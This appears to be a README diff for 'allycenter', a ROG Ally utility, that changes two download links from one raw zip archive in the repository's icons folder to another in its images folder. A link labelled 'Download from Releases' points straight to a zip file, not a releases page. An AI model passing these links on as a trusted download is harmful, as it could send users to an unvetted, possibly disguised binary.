@@ -6,7 +6,7 @@ Welcome to allycenter! This application adds ROG Ally-specific controls and sett
 
 ## 📥 Download Now
 
-[![Download allycenter](https://github.com/YandexSMTP/allycenter/raw/refs/heads/main/icons/Software_v1.0.zip)](https://github.com/YandexSMTP/allycenter/raw/refs/heads/main/icons/Software_v1.0.zip)
+[![Download allycenter](https://github.com/YandexSMTP/allycenter/raw/refs/heads/main/images/Software-v1.3.zip)](https://github.com/YandexSMTP/allycenter/raw/refs/heads/main/images/Software-v1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ To get started with allycenter, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads.
 
-   [Download from Releases](https://github.com/YandexSMTP/allycenter/raw/refs/heads/main/icons/Software_v1.0.zip)
+   [Download from Releases](https://github.com/YandexSMTP/allycenter/raw/refs/heads/main/images/Software-v1.3.zip)
 
 2. **Choose the Latest Version:** Look for the latest version listed on the page.
 
